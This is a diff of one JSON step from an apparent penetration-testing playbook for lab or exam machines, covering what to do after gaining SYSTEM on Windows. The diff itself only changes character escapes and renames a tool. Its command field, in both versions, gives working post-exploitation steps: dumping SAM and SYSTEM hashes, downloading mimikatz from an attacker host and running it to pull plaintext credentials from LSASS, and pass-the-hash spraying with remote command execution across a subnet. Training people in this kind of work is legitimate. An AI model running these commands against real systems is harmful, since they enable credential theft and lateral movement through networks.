@@ -1,17 +1,17 @@
 {
   "id": "got_root_windows",
   "phase": "WINDOWS",
-  "title": "SYSTEM — Windows",
+  "title": "SYSTEM \u2014 Windows",
   "body": "SYSTEM shell. Get proof, take the screenshot correctly. whoami + hostname + ipconfig + proof.txt all visible.",
-  "cmd": "whoami   # should show NT AUTHORITY\\SYSTEM or Administrator\nhostname\nipconfig /all\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\n\n# ── POST-SYSTEM ACTIONS ──────────────────────────────\n# Dump hashes immediately\nreg save HKLM\\SAM C:\\Windows\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\system\nimpacket-secretsdump -sam sam -system system local\n\n# Mimikatz — plaintext creds from LSASS\niwr http://$lhost/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe\n.\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n\n# Spray dumped hashes laterally\ncrackmapexec smb $ip/24 -u Administrator -H NTLMHASH --shares\ncrackmapexec smb $ip/24 -u Administrator -H NTLMHASH -x \"whoami\"\n\n\n# Screenshot checklist:\n# ✅ whoami showing SYSTEM or Administrator\n# ✅ hostname visible\n# ✅ ipconfig showing target IP\n# ✅ type proof.txt showing hash\n# ✅ All in ONE screenshot",
+  "cmd": "whoami   # should show NT AUTHORITY\\SYSTEM or Administrator\nhostname\nipconfig /all\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\n\n# \u2500\u2500 POST-SYSTEM ACTIONS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# Dump hashes immediately\nreg save HKLM\\SAM C:\\Windows\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\system\nimpacket-secretsdump -sam sam -system system local\n\n# Mimikatz \u2014 plaintext creds from LSASS\niwr http://$lhost/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe\n.\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n\n# Spray dumped hashes laterally\nnxc smb $ip/24 -u Administrator -H NTLMHASH --shares\nnxc smb $ip/24 -u Administrator -H NTLMHASH -x \"whoami\"\n\n\n# Screenshot checklist:\n# \u2705 whoami showing SYSTEM or Administrator\n# \u2705 hostname visible\n# \u2705 ipconfig showing target IP\n# \u2705 type proof.txt showing hash\n# \u2705 All in ONE screenshot",
   "warn": null,
   "choices": [
     {
-      "label": "New subnet in route print — pivot!",
+      "label": "New subnet in route print \u2014 pivot!",
       "next": "pivot_start"
     },
     {
-      "label": "Back to start — next machine",
+      "label": "Back to start \u2014 next machine",
       "next": "start"
     }
   ]
